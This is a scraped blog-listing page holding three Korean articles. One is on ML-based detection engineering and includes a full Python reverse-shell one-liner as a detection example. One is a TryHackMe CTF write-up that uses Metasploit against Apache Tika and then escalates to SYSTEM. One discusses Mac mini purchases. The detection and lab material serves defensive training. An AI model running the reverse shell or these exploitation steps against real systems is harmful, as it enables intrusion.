이것이 단계 2입니다.\n\n<div class=\"content-ad\"></div>\n\n과거 사례에서 어떤 사람이 정당한 활동과 악의적인 활동 사이의 의사 결정 경계를 구축합니다. 사실 현대 ML 알고리즘은 여기에 정말 강합니다. ML 휴리스틱은 특정 TTP 주변의 대규모 정당한 활동을 수동으로 걸러내는 부담을 줄일 수 있습니다. 따라서 ML은 더 많은 작업 없이 시그니처 규칙보다 넓은 휴리스틱을 구축할 수 있게 합니다.\n\n# 스위스 치즈 모델\n\n이제 우리는 종합적인 비전을 개요로 설명할 준비가 되었습니다.\n\n전통적인 탐지 엔지니어링 접근 방식은 SOC 대시보드가 넘치지 않도록 가능한 많은 시그니처 규칙을 쌓는 것입니다. 이러한 각 규칙은 높은 거짓 부정률 (FNR)을 가지지만 낮은 거짓 양성률 (FPR)을 가집니다.\n\n<div class=\"content-ad\"></div>\n\n우리는 ML 휴리스틱을 계속 쌓아갈 수 있습니다. 이때 FPR에 대한 요구 사항은 낮아야 합니다. 왜냐하면 유일한 병목 현상을 보호해야 하기 때문입니다: 인간 분석가의 주의력입니다. ML 휴리스틱은 보안 엔지니어의 시간 자원을 크게 고갈시키지 않고 더 일반적인 행동 논리를 도입함으로써 규칙 기반 감지의 틈을 메울 수 있습니다.\n\n만약 대부분의 낮은 hanging fruits를 다루었고 행동 분석에 더 깊게 집중하고 싶다면, 현재 활용 중인 것 위에 딥 러닝 논리를 추가할 수 있습니다.\n\n![ML heuristics](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_5.png)\n\nOccam의 면도날 원리를 기억하고, 가능한 간단하게 모든 새로운 휴리스틱을 구현하세요. 신호 규칙이 신뢰할 수 있는 기준선을 정의할 수 없는 경우에만 ML을 사용하십시오.\n\n<div class=\"content-ad\"></div>\n\n예를 들어, 이전에 언급한 이상한 Python 실행과 관련해 — Python 아규먼트는 여전히 환경 내에서 너무 다양할 수 있어서 너무 많은 이상 활동에 대한 경고를 받을 수 있습니다. 더 좁혀서 특정해야 할 수도 있습니다. 예를 들어, 명령줄에 -c가 포함된 프로세스만 캡처하여 Python 바이너리에 인수로 전달된 코드를 찾는 경우에 사용할 수 있습니다. 따라서, 이러한 Python 역술술에만 집중하는 방법을 고려해볼 수 있습니다:\n\n```js\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\n```\n\nFPR을 감소시키면 False-Negative가 증가합니다. 따라서, 특이한 이름을 가진 스크립트로부터 Python 실행을 놓칠 수 있습니다. 예를 들어, python fake_server.py와 같이 사용자가 도용한 가짜 서비스를 사용하는 공격자들이 사용할 수 있는 스크립트입니다. 이를 위해 이러한 TTP들의 하위 집합에 중점을 둔 FPR이 낮은 별도의 휴리스틱을 만들어보는 것이 좋을 수 있습니다.\n\n# 메타-감지 계층\n\n<div class=\"content-ad\"></div>\n\n스위스 치즈 방법론을 따라도 상세한 휴리스틱을 얻게 됩니다. 보통 이러한 것들은 악의적인 의도를 나타내는 것은 아니지만 맥락에 관심이 있는 것입니다.\n\n예를 들어, 새 소스에서 고심도 호스트로 SSH/RDP 로그인하는 것은 나쁜 것이 아닙니다(그냥 새 직원이나 워크스테이션일 수 있습니다), 또한 skilled 사용자 중에 whoami /all 실행이 일반적일 수 있습니다. 따라서 이러한 휴리스틱 모두 경보를 직접 트리거하기에 적합하지 않습니다. 그러나 두 가지의 조합은 분석가의 주의를 끌 수 있을지도 모릅니다.\n\n이 딜레마의 해결책은 \"True Positive Benigns\"를 생성하는 이러한 상세한 규칙 위에 추가적인 논리를 도입하는 것입니다. 우리는 이것을 메타-감지 계층이라고 부를 수 있습니다.\n\n![아키텍처](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_6.png)\n\n<div class=\"content-ad\"></div>\n\n룰 활성화 위에 적용되는 메타로직은 다양할 수 있지만 일반적으로 두 단계로 이뤄집니다:\n\n- \"그룹화\": 모든 활성화를 \"엔티티\"별(예: 호스트, 사용자 이름, 소스 IP, 쿠키 등)로 그룹화합니다.\n- 일정 기간 내의 활성화에 대한 \"집계 함수\"를 적용합니다.\n\n간단하면서도 기능적인 메타 탐지 로직의 예시:\n\n- 단일 엔티티(호스트 또는 사용자와 같은)에서 다른 룰 트리거의 수를 카운트하고, 세 시간 내에 세 가지 이상의 다른 룰이 트리거되면 보고합니다.\n- 위와 동일하나, 심각성을 기준으로 룰에 가중치를 부여하고, \"중요\" 룰은 3으로, \"중간\"은 2로, \"정보\"는 1로 취급하여 임계값을 초과할 경우 보고합니다.\n\n<div class=\"content-ad\"></div>\n\n더 정교한 방법들이 존재하는데, 저는 악성 코드 표현에 ML의 두 번째 층을 사용하는 AISec ’22 논문에 정의된 방법을 사용하고 있어요. 이들은 특정 어플리케이션과 환경에 튜닝되어야 해요. 왜냐하면 데이터 세부 정보, 텔레메트리 양 및 인프라 규모에 따라 다른 접근 방식이 필요해요. 이러한 접근 방식은 적절한 경고 한도를 유지하는 데 도움이 돼요.  \n\n# 결론  \n\n이 기사에서 우리는 시그니처 방식을 넘어서 보안 작업 무기함을 확장하는 사고 방식에 대해 논의했어요. 대부분의 구현은 보안 전문가들이 기계 학습(ML)을 통한 행동 휴리스틱에 너무 광범위한 요구 사항을 정의하기 때문에 제대로 수행하지 못했어요.  \n\n우리는 적절한 적용은 공격적인 기술, 전술 및 절차(TTPs)에 의해 이끌어져야 한다고 주장해요. 올바르게 사용될 때, ML 기술은 특정 TTP 주변의 합법적인 활동의 기준을 효율적으로 걸러내는 데 많은 인력을 절약할 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n성숙하고 성공적인 보안 체계는 시그니처와 행동 휴리스틱이 결합된 것으로 구성됩니다. 각각의 별도 검출 논리는 낮은 거짓 긍정률을 갖추고, 거짓 부정을 놓치지 않기 위한 제한 사항은 병렬로 여러 휴리스틱을 적용함으로써 균형을 이룹니다.\n\n이 글에서 사용된 예시는 전통적인 보안 운영에 적용될 경우 감지 엔지니어링 사례를 포함하고 있습니다. 그러나 우리는 같은 방법론이 제한적인 수정을 통해 다른 보안 응용프로그램에서도 유용할 것이라 주장합니다. 예를 들어, EDR/XDR 휴리스틱 공간, 네트워크 트래픽 분석 및 계산 등이 있습니다.\n\n# 추가 정보\n\n## 기술 노트: 고정된 거짓 긍정률 하에서 검출률 추정\n\n<div class=\"content-ad\"></div>\n\n프로덕션 환경에서 행동 ML 휴리스틱 유틸리티를 평가하는 방법에 대한 코드 샘플이 포함된 공지입니다.\n\n데이터 과학자 여러분 — 정확도, F1-스코어 및 AUC와 같은 지표는 보안 솔루션의 프로덕션 준비 상태에 대해 거의 알려주지 않습니다. 이러한 메트릭은 여러 솔루션이 얼마나 유용한지를 추론하는 데 사용될 수 있지만 절대적인 값을 제공하지는 않습니다.\n\n보안 텔레메트리에서 발생하는 베이스 레이트 펄러시 때문에 이렇습니다 — 기본적으로 모델이 볼 수 있는 모든 데이터는 양성 샘플들입니다 (양성 샘플이 아닌 경우를 실제로 가리킴). 따라서 심지어 0.001%의 가짜 양성률이 있더라도 휴리스틱이 매일 10,000개의 확인을 수행한다면 하루에 10건의 경보를 생성할 것입니다.\n\n모델의 유일한 실제 가치는 고정된 가짜 양성률(FPR) 하에서의 탐지율(즉, 실제 양성률, TPR)을 살펴보는 것으로 추정됩니다.\n\n<div class=\"content-ad\"></div>\n\n아래 도표를 살펴봐주세요 — x축은 데이터 샘플의 실제 레이블을 나타냅니다. 이는 악성 또는 양성일 수 있습니다. y축에는 모델의 확률적 예측이 표시됩니다 — 샘플이 얼마나 나쁜 것으로 생각하는지입니다:\n\n![Plot](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_7.png)\n\n만약 단 하나의 잘못된 경고만 허용된다면, 모델의 결정 임계값을 약 ~0.75(파선이 그어진 빨간 선)로 설정해야 합니다. 두 번째 잘못된 긍정 값(위양성) 바로 위에 있습니다. 따라서 모델의 현실적인 감지율은 약 50%입니다 (점선이 상자그림의 평균값과 거의 일치합니다).\n\n변경 가능한 위양성율에 따른 감지율 평가는 아래의 코드 예시로 수행할 수 있습니다:\n\n```python\n# 코드 샘플\ndef evaluate_detection_rates(y_true, preds):\n    # 코드 구현 내용\n```","ogImage":{"url":"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png"},"coverImage":"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png","tag":["Tech"],"readingTime":11},{"title":"TryHackMe Writeup - CyberLens를 번역해보겠습니다","description":"","date":"2024-05-20 18:10","slug":"2024-05-20-TryHackMeWriteup-CyberLens","content":"\n\n## CyberLens 웹 서버를 악용하고 숨겨진 플래그를 발견할 수 있을까요?\n\n\"사이버 렌즈\" CTF 룸에 오신 것을 환영합니다!\n\n2024년 5월 17일에 공개된 이 CTF 챌린지는 약 120분 정도 소요되며 \"쉬움\" 난이도로 평가됩니다.\n하지만 제 개인적인 경험에 따르면, 완료하는 데 2시간이 넘게 걸렸어요.\n\n🕵️‍♂️ 준비가 되셨나요? 룸을 찾을 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n🔍 챌린지 설명 확인: 챌린지에 대한 자세한 내용은 방의 내용을 확인하세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_0.png)\n\n## 주의 사항\n\n1. IP를 /etc/hosts 파일에 추가하세요: `sudo echo [IP] cyberlens.thm >> /etc/hosts`\n\n<div class=\"content-ad\"></div>\n\n\n이 공간은 CyberLens 및 그들의 전문 도구에 대해 다루며, 스테가노그래피에 초점을 맞출 수도 있습니다. 화법 및 메타데이터를 위해 이미지를 분석하거나 숨겨진 플래그를 찾기 위해 이러한 도구 내의 취약점을 이용할 수도 있습니다.\n\n## 열거\n\n우리는 빠른 스캔을 위해 올드스쿨 nmap으로 시작합니다.\n그리고 흥미로운 포트가 열려 있는 것을 발견합니다\n\n```js\n─# nmap 10.10.189.206 -A\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 09:40 EDT\nNmap scan report for cyberlens.thm (10.10.189.206)\nHost is up (0.10s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Apache httpd 2.4.57 ((Win64))\n|_http-server-header: Apache/2.4.57 (Win64)\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: CyberLens: Unveiling the Hidden Matrix\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=CyberLens\n| Not valid before: 2024-05-17T13:10:13\n|_Not valid after:  2024-11-16T13:10:13\n| rdp-ntlm-info: \n|   Target_Name: CYBERLENS\n|   NetBIOS_Domain_Name: CYBERLENS\n|   NetBIOS_Computer_Name: CYBERLENS\n|   DNS_Domain_Name: CyberLens\n|   DNS_Computer_Name: CyberLens\n|   Product_Version: 10.0.17763\n|_  System_Time: 2024-05-18T13:47:39+00:00\n|_ssl-date: 2024-05-18T13:47:47+00:00; -10s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7)... redacted ...\n\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-05-18T13:47:41\n|_  start_date: N/A\n|_clock-skew: mean: -10s, deviation: 0s, median: -10s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT       ADDRESS\n1   125.60 ms 10.9.0.1\n2   121.35 ms cyberlens.thm (10.10.189.206)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 464.64 seconds\n```\n\n<div class=\"content-ad\"></div>\n\n- 80/tcp: Apache httpd 2.4.57에서 오픈된 HTTP — CVE 발견 안 됨\n- 135/tcp: Microsoft Windows RPC 오픈\n- 139/tcp: Microsoft Windows netbios-ssn 오픈\n- 445/tcp: Microsoft-DS 오픈\n- 3389/tcp: Microsoft Terminal Services (RDP) 오픈\n\n우리는 웹사이트를 돌아다니다가, dirb를 실행하여 새로운 디렉토리를 발견하였어요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_1.png)\n\n우리의 관심을 끄는 두 가지 발견:\n\n<div class=\"content-ad\"></div>\n\n1. 연락 양식: 현재 유용한 정보가 없습니다.\n2. 이미지 추출기: 저희 조사에 대한 잠재적인 통찰력을 약속하는 온라인 메타데이터 추출 서비스입니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_2.png)\n\n나는 http://cyberlens.thm/images/에서 찾은 이미지를 힌트를 얻기 위해 도구에 업로드했지만 유용한 메타데이터를 찾을 수 없었습니다.\n\n다음으로 \"메타데이터 가져오기\" 버튼을 조사하고 해당 이벤트를 추적했습니다. 이로써 다음이 드러났습니다:\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_3.png\" />\n\nnmap 결과에 이 포트가 나오지 않았어요. 이 포트는 일반적이지 않은 포트라서이고, -p- 플래그를 사용하지 않았기 때문입니다. 일반적으로는 권장되지 않아요.\n\n<img src=\"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_4.png\" />\n\n첫 번째로는 해당 아파치 티카 버전에 대한 CVE를 찾아보는 거에요.\n\n<div class=\"content-ad\"></div>\n\nMetasploit을 시작하고,\n\n![CyberLens_5](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_5.png)\n\n## 접근 방법\n\nMetasploit을 구성하고 (set RHOSTS, RPORT, LPORT), 그런 다음 exploit을 실행합니다. 그리고 바로 Meterpreter 세션을 열었습니다. 와우!\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_6.png)\n\n우선 CyberLens의 문서에서 깃발을 찾으려고 했어요. 대신 관리 부분을 우연히 발견했어요. 거기에서 승격을 위해 사용할 자격 증명을 찾았어요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_7.png)\n\n힌트에서 이해한대로 대부분의 Windows 깃발은 데스크톱에 있기 때문에 거기로 가서 첫 번째 깃발을 얻었어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_8.png\" />\n\n## 권한 상슨\n\n이전에 찾은 자격 증명을 다시 보면, 원격 데스크톱 프로토콜(RDP) 포트 3389과 일치합니다.\n그래서 remmina를 실행하지만, 동일한 사용자로 굳어 버린 것을 발견합니다. 이는 클래식한 실수였습니다. 사용자 이름에 주의를 기울이지 않았기 때문입니다. 권한 상슨이 내가 희망했던 만큼 간단하지 않을 것이라는 것을 알게 되었습니다. 그럼에도 불구하고 GUI 인터페이스를 보유하고 있기 때문에 이제 시스템을 쉽게 탐색할 방법이 제공되었습니다.\n\n다음으로 모든 서비스를 나열했습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\nsc.exe query state=all\n```\n\n하지만 리스트가 굉장히 길었고, 수작업으로 걸러내는 대신 더 포괄적인 분석을 위해 WinPEAS를 실행하기로 결정했습니다.\n\n이미 존재하는 Metasploit 쉘을 고려할 때, 나는 나의 접근 방식을 전환했습니다. WinPEAS 대신 Metasploit의 multi/recon/local_exploit_suggester 모듈을 사용하여 권한 상승을 위한 잠재적인 취약점을 식별했습니다.\n\n<img src=\"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_9.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n세션을 설정하고 모듈을 실행하여 총 세 가지 취약점을 발견했어요. 먼저 첫 번째 취약점부터 시작해서 해당 옵션을 구성한 후(exploit를 실행하기 전에 LHOST, LPORT, SESSION을 설정해주세요).\n\n그리고 이제 NT AUTHORITY\\SYSTEM으로 권한 상승했어요.\n\n![TryHackMeWriteup-CyberLens_10](/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_10.png)\n\n관리자의 데스크톱에 깃발이 있을 거에요.\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\n- 주의 깊은 열거: 중요한 서비스를 식별하면서 모든 포트를 스캔하는 것을 잊지 마세요 (-p-).\n- 수동 열거: 잠재적으로 간과된 단서를 잡는 데 중요합니다.\n- 도전의 조합: 웹 취약점 분석과 권한 상승을 결합했습니다.\n- 적응성 있는 전략: 수동 서비스 분석 및 WinPEAS에서 Metasploit의 익스플로잇 제안자로 전환했습니다.\n- 주요 발견: 취약점을 발견하고 악용하여 사용자와 관리자 깃발을 얻었습니다.\n- 필수 기술: 적응적 전략 및 실용적 사이버 보안 기술을 강화했습니다.\n\nLinkedIn에서 저와 연결하세요.","ogImage":{"url":"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_0.png"},"coverImage":"/assets/img/2024-05-20-TryHackMeWriteup-CyberLens_0.png","tag":["Tech"],"readingTime":6},{"title":"맥 미니에 대한 큰 질문","description":"","date":"2024-05-20 18:08","slug":"2024-05-20-TheBigQuestionAbouttheMacmini","content":"\n\n\n![](/assets/img/2024-05-20-TheBigQuestionAbouttheMacmini_0.png)\n\n우리는 이미 이전에 여기 있었죠, 그렇죠?\n\n가능성이 있어요.\n\n24인치 iMac과 마찬가지로 Mac mini도 Apple로부터 냉대를 받은 적이 많아요. Intel 시대에는 너무 오랫동안 방치되어 왔다는 느낌이었지만, M1 칩이 도입되면서 최종적인 소멸에 대한 불안이 다행히도 걷혔어요.\n\n\n<div class=\"content-ad\"></div>\n\n저희가 오늘 이야기할 상황은 조금 다릅니다. 올해 초에 M2 및 M2 Pro 칩이 내장된 새로운 맥 미니를 받았어요. 제 스튜디오에는 후자가 있고, 스튜디오 디스플레이에 자랑스럽게 연결되어 있습니다. 이 기계는 뛰어난 성능을 자랑합니다.\n\n따라서 현재 맥 미니 라인업은 아직 상대적으로 어립니다. 그러나 지난 달 M3 칩이 출시되었고, 스컬리 빠른 애플 이벤트에서 맥 미니가 눈에 띄게 부재한 점을 고려하면, M3 맥 미니를 볼 수 있을지에 대해 궁금해합니다.\n\n더 중요한 것은, 애플이 2023년에 맥 미니에 M3 칩을 포함하지 않은 결정으로, 오늘 diminutive desktop powerhouse을 필요로 하는 사람들에게 선택의 어려운 상황을 만드는 것입니다.\n\n만약 그 그룹에 속해 계신다면, 도와드리고 싶어요.\n\n<div class=\"content-ad\"></div>\n\n## M3 맥 미니가 나올까요?\n\n저는 정말 전혀 모릅니다 — 죄송해요.\n\n루머에 대해 현실적으로 생각해보는 시기가 온 것 같아요. 지난 달 빠른 속도의 맥 런칭 이벤트 이후 분명하게 드러난 한 가지는, Mark Gurman과 같은 사람들이 단순히 직감과 의심스러운 소문에 의지하고 있다는 것이에요.\n\n이겁니다만 이에 대한 근거가 전혀 없어요 (이게 문제의 일부인 것 같아요) 하지만 Gurman과 그의 친구들을 여러 년간 지켜봤는데, 주변에서 관찰할 때 분명하게 그들은 한 번은 신뢰할 만했던 이곳의 내부인 사람들과 연락을 끊었거나, 아니면 그들과 동일한 연락처들이 단지 그들과 재미를 느끼고 있는 것 같아요.\n\n<div class=\"content-ad\"></div>\n\n다음 몇 주, 몇 달 또는 몇 년 동안 읽을 수 있는 정보들 중에서, 새로운 맥 미니가 언제 출시될지 알고 있는 사람들은 애플 제품 출시를 책임지고 있는 사람들 뿐입니다. 그들은 공개적으로 많은 얘기를 하지 않죠.\n\n그래서, 저는 이 멋진 작은 컴퓨터의 M3 버전이 출시될지 여부에 대한 추측만을 제공할 수 있습니다.\n\n제 생각에는 출시될 것 같아요. 하드웨어 출시 일정과 마찬가지로, 맥 미니 판매 실적 분석에 대해 여러분만큼 알지는 못하지만, 그 기기가 애플의 계획에 영구적으로 남아 있는 충분히 긍정적인 영향을 믿고 있어요.\n\n하지만 지금 필요하다면 어떻게 해야 할까요?\n\n<div class=\"content-ad\"></div>\n\n알아볼 것부터 시작해 보죠 — 만약 최신 칩을 정말 원한다면.\n\n## M2 Mac mini 대 M3 iMac: 비교하면 어떨까요?\n\nM2 Mac mini의 가장 가까운 비교 대상은 최근 출시된 M3 iMac입니다.\n\n제가 타자를 치며 이 글을 쓰는 동안, 저 뒤에 하나가 있습니다. 마크 엘리스 리뷰의 성능 테스트를 위해 언박싱을 기다리고 있는데요. 거의 3년 만에 M1 버전이 출시된 이후에 얼마나 발전했는지 기대됩니다. 하지만 여러분이 궁금한 건 아마도 M2 Mac mini를 사야 할지 여부일 것입니다.\n\n<div class=\"content-ad\"></div>\n\n이 두 대의 Mac은 매우 유사하지만 매우 다릅니다. 먼저 칩의 차이가 있습니다. 베이스 M3 칩을 사용한 것은 초기 단계이며, 초기 스트레스 테스트 및 성능 벤치마크가 조금씩 나오기 시작했습니다. 그렇지만, 사양 스케일 하위에 속하는 것을 찾고 있다면, M2 Mac mini와 M3 iMac은 일상적인 사용에서 별 차이가 없을 것입니다.\n\n일상 업무에서는 서로 엄청 빠른 느낌을 받게 될 것입니다. M3 iMac이 M2 Mac mini보다 새로운 칩을 사용하기 때문에 macOS가 더 빨라지게 느껴지지 않을 것입니다. 통합 메모리나 내부 저장소를 늘린다고 해도 마찬가지입니다. 이 두 대는 캐주얼한 비전문가 및 비즈니스용으로 뛰어난 성능을 자랑합니다.\n\n차이는 가격 및 디스플레이에 있습니다. M3 iMac에는 키보드, 마우스 및 아름다운 24인치 레티나 디스플레이가 포함되어 있습니다. M2 Mac mini에 동일한 설정을 원한다면(전원 코드만 포함되어 있는 제품입니다), 모든 주변기기를 별도로 구매해야 합니다. 이렇게 되면 비용이 많이 들고 꼬리가 길어질 수 있습니다. 그리고 아직 iMac에 내장된 디스플레이만큼 좋은 외부 디스플레이를 찾는 것도 문제입니다.\n\nM2 Mac mini와 M3 iMac를 비교할 수 있을까요? 불편하지만 그렇지 않습니다. 그렇기 때문에 후자를 선택할 것입니다. 단, 프로 성능이 필요하다면, M2 Pro Mac mini가 최고 선택일 것입니다.\n\n<div class=\"content-ad\"></div>\n\n혹은 그렇지 않을까요?\n\n## M2 Pro 맥 미니 vs M3 맥북 프로\n\n조금 이상하죠?\n\n음, 꼭 그런 것은 아니에요. 베이스 모델인 M2 Pro 맥 미니는 1,399 파운드부터 시작해요. 이것에는 10코어 CPU, 16코어 GPU, 16GB의 통합 메모리, 그리고 512GB SSD가 포함되어 있어요. 저는 지금 제 것을 사용 중이고, 정말 멋지답니다.\n\n<div class=\"content-ad\"></div>\n\n14인치 M3 Pro MacBook Pro의 기본 모델은 £2,099부터 시작하여 11코어 CPU, 14코어 GPU, 18GB의 통합 메모리 및 512GB SSD가 포함되어 있습니다.\n\n한 번 더 말하자면, 이들은 매우 다른 맥북입니다. MacBook Pro는 휴대가 가능하며 아름다운 내장형 Liquid Retina 디스플레이와 ProMotion, 심지어 SD 카드 슬롯이 포함되어 있습니다. M2 Pro Mac 미니는? 그렇습니다, 이러한 부품을 직접 추가해야 합니다.\n\n그러나 이동이 필요하지 않고 독립적으로 주변 기기와 디스플레이를 구입하고 싶다면 (어쨌든 MacBook Pro의 14인치 디스플레이가 충분하지 않을 수 있음), M2 Pro Mac 미니는 점점 유혹적인 선택지가 됩니다.\n\n이것은 가장 예상치 못한 비교 중 하나라고 인정합니다만, 더 깊이 파고들수록 흥미로워집니다. 최종적으로 내리는 결정은 다시 한 번, 주변 기기와 디스플레이를 독립적으로 구입하고 싶은 욕망 및 이동이 필요한지 여부에 따라 달라질 것입니다.\n\n<div class=\"content-ad\"></div>\n\n성능 차이는 낮은 사양의 M3 Pro MacBook Pro와 고성능 M2 Pro Mac mini 간에는 벤치마킹 그룹 외에는 미미할 것입니다. 그 사실을 잊지 마세요.\n\n## 결론: M3 Mac mini를 기다려야 할까요?\n\n안돼요. 아쉽지만 그럴 가치가 없습니다.\n\nM3 Mac mini는 오늘 도착할 수도 있고, 다음 주에 도착할 수도 있습니다. 우리는 2025년까지 기다려야 할 수도 있습니다. 아예 2024년을 건너뛸 수도 있어요. 또는 M4 칩이 나올 때까지 기다릴 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n아무도 Mac mini에 대해 다음에 무엇을 할지 알지 못합니다. 오늘 이 블로그 글을 읽고 계신다면, 곧 필요하거나 원하시는 것이 있을 것으로 생각됩니다.\n\n직감을 따라 가세요. 필요한 Mac을 오늘 구입하고, 내일 일어날 일에 대해 모두 잊어버리세요!\n\n## 떠나시기 전에\n\n내 이메일 뉴스레터에 가입하여 매주 테크 콘텐츠 크리에이터의 비하인드-더-신 페이지를 시청하세요! 본 게시물에는 제휴 링크가 포함되어 있습니다.\n\n<div class=\"content-ad\"></div>\n\n2023년 11월 9일에 https://markellisreviews.com에서 최초로 게시되었습니다.","ogImage":{"url":"/assets/img/2024-05-20-TheBigQuestionAbouttheMacmini_0.png"},"coverImage":"/assets/img/2024-05-20-TheBigQuestionAbouttheMacmini_0.png","tag":["Tech"],"readingTime":4}],"page":"27","totalPageCount":61,"totalPageGroupCount":4,"lastPageGroup":20,"currentPageGroup":1},"__N_SSG":true}